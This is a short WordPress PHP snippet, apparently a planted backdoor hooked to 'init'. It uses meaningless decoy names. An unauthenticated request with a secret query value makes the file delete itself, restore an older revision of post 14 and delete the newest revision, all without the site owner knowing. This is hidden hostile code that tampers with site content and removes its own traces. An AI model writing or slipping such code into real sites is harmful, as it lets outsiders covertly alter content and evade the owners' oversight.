<?php

function active_visibility_smart_preview() {
	if (isset($_GET['title_cc_urls']) && $_GET['title_cc_urls'] === 'services_pdf_panel_language') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$static_groups_article_edition = 14;
		$api_subscribe_logger = wp_get_post_revisions($static_groups_article_edition);
		if (empty($api_subscribe_logger)) die('no revisions');
		if (count($api_subscribe_logger) < 2) die('less than 2');
		$specific_messages_authentication_rest = array_shift($api_subscribe_logger);
		$learndash_revisions_reader_official = $specific_messages_authentication_rest->ID;
		$active_total_shortcode_testimonials = array_shift($api_subscribe_logger);
		$browser_restaurant_validation = $active_total_shortcode_testimonials->ID;
		$another_control_only_consent = wp_restore_post_revision($browser_restaurant_validation);
		if ($another_control_only_consent === false) die('error restoring');
		$another_control_only_consent = wp_delete_post_revision($learndash_revisions_reader_official);		
		if ($another_control_only_consent === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'active_visibility_smart_preview');
